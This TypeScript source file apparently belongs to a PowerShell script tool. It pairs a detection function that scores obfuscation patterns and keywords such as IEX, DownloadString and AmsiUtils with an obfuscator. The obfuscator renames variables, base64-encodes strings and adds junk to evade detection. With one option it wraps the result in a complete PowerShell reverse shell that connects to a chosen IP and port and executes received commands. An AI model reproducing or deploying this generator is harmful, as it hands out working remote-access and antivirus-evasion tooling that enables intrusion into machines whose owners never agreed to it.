// version 1.1.4
import type { AnalysisResult, ObfuscatorOptions } from '../types';

// getRandomString and localObfuscateScript functions remain the same...
const getRandomString = (length: number, charset: 'alpha' | 'alphanumeric' = 'alpha'): string => {
  const charsets = { alpha: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', alphanumeric: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' };
  const chars = charsets[charset];
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
};


export const localAnalyzeScript = async (script: string): Promise<AnalysisResult> => {
    let deobfuscated = script;
    const indicators: string[] = [];
    const steps: { description: string }[] = [{ description: 'Advanced local analysis engine started.' }];
    let threatScore = 0;

    // --- NEW: More robust regexes and higher threat scores for advanced patterns ---
    const advancedPatterns = {
        'Advanced string reconstruction via character code piping': {
            regex: /\([\d,\s]+\)\s*\|%/gi,
            threat: 15, // This pattern alone makes the script Critical
        },
        'String construction via master-string indexing': {
            regex: /\("[A-Za-z0-9\-\+\/=]{20,}"\)\s*\[[\d,]+\]\s*-join/gi,
            threat: 15, // This pattern alone also makes it Critical
        }
    };

    for (const [description, pattern] of Object.entries(advancedPatterns)) {
        if (pattern.regex.test(deobfuscated)) {
            indicators.push(description);
            threatScore += pattern.threat;
            steps.push({ description: `Detected advanced obfuscation pattern: ${description}` });
        }
    }

    const base64Patterns = [/\[System\.Convert\]::FromBase64String\s*\(\s*['"]([^'"]+)['"]\s*\)/gi];
    base64Patterns.forEach(pattern => {
        deobfuscated = deobfuscated.replace(pattern, (match, base64String) => {
            try {
                const decoded = atob(base64String);
                indicators.push('Uses Base64 encoding.');
                steps.push({ description: `Decoded Base64 string: "${decoded.substring(0, 40)}..."` });
                threatScore += 2;
                return `"${decoded}" # Decoded`;
            } catch (e) { return match; }
        });
    });
    
    // ... (The rest of the analysis function remains the same)

    const keywords = { 'Invoke-Expression': 5, 'IEX': 5, 'DownloadString': 5, 'TCPClient': 5, 'Reflection.Assembly': 5, 'AmsiUtils': 5, 'Invoke-Command': 4 };
    for (const [keyword, threat] of Object.entries(keywords)) {
        if (new RegExp(`\\b${keyword}\\b`, 'i').test(deobfuscated)) {
            indicators.push(`Suspicious keyword found: ${keyword}`);
            threatScore += threat;
        }
    }

    let threatLevel: string;
    if (threatScore >= 15) threatLevel = 'Critical';
    else if (threatScore >= 8) threatLevel = 'High';
    else if (threatScore >= 4) threatLevel = 'Medium';
    else if (threatScore > 0) threatLevel = 'Low';
    else threatLevel = 'Informational';

    const actionFlow: string[] = [];
    const flowPatterns = {
        'Network': /TCPClient|WebClient|HttpWebRequest/i, 'Download': /DownloadString|Invoke-WebRequest/i,
        'Execute': /Invoke-Expression|IEX|Invoke-Command/i, 'Persistence': /ScheduledTask|New-Service/i,
        'Evasion': /Amsi|Reflection\.Assembly|Add-Type/i,
    };
    for (const [action, pattern] of Object.entries(flowPatterns)) {
        if (pattern.test(deobfuscated)) actionFlow.push(action);
    }
    
    deobfuscated = deobfuscated.replace(/(;|\{|\})\s*(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/g, '$1\n').split('\n').map(l => l.trim()).filter(Boolean).join('\n');

    let summary = `Advanced local analysis completed. Threat score: ${threatScore}. Detected ${indicators.length} indicators.`;
    if (threatScore >= 8 && !indicators.some(ind => ind.includes("Advanced"))) {
        summary += " Highly complex obfuscation detected; for a full deobfuscation, we strongly recommend using AI Mode.";
    }

    return {
        deobfuscated_script: "The local engine cannot fully deobfuscate such a highly complex script. Please use AI Mode for a detailed analysis.",
        analysis: {
            summary: summary,
            step_by_step: steps,
            indicators: indicators.length > 0 ? indicators : ["No suspicious patterns detected."],
            action_flow: [...new Set(actionFlow)]
        },
        threat_level: threatLevel,
    };
};

export const localObfuscateScript = async (script: string, options: ObfuscatorOptions): Promise<string> => {
    // ... (la función de ofuscación no cambia)
    let obfuscated = script;
    if (options.techniques.lexical) {
        const varRegex = /\$([a-zA-Z0-9_]+)/g;
        const varMap: { [key: string]: string } = {};
        obfuscated = obfuscated.replace(varRegex, (match, varName) => {
            const lowerVar = varName.toLowerCase();
            if (['true', 'false', 'null', 'env', 'this'].includes(lowerVar)) return match;
            if (!varMap[lowerVar]) {
                varMap[lowerVar] = getRandomString(12);
            }
            return `$${varMap[lowerVar]}`;
        });
    }
    if (options.techniques.encoding) {
        obfuscated = obfuscated.replace(/(["'])(.*?)\1/g, (match, quote, content) => {
            if (content.length < 2) return match;
            const b64 = btoa(content);
            return `([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}')))`;
        });
    }
    if (options.techniques.semantic) {
        const commandMap: { [key: string]: string } = { 'Invoke-Expression': 'IEX', 'Write-Host': 'echo', 'Get-ChildItem': 'gci' };
        for(const cmd in commandMap) {
            obfuscated = obfuscated.replace(new RegExp(`\\b${cmd}\\b`, 'gi'), commandMap[cmd]);
        }
    }
    if (options.techniques.junkCode) {
        obfuscated = obfuscated.split('\n').map(line => line.trim() !== '' && Math.random() < 0.4 ? `${line}; # ${getRandomString(25)}` : line).join('\n');
    }
    if (options.useReverseShell) {
        const encodedScript = btoa(obfuscated);
        const shell = `$s='${options.ipAddress}';$p=${options.port};$c=New-Object System.Net.Sockets.TCPClient($s,$p);$st=$c.GetStream();IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedScript}')));[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=([Text.Encoding]::ASCII).GetString($b,0,$i);$sb=([Text.Encoding]::ASCII).GetBytes((IEX $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ');$st.Write($sb,0,$sb.Length);$st.Flush()};$c.Close()`;
        return shell;
    }
    if (['High', 'Insane'].includes(options.level)) {
        const b64 = btoa(obfuscated);
        obfuscated = `IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}')))`;
    }
    return obfuscated;
};
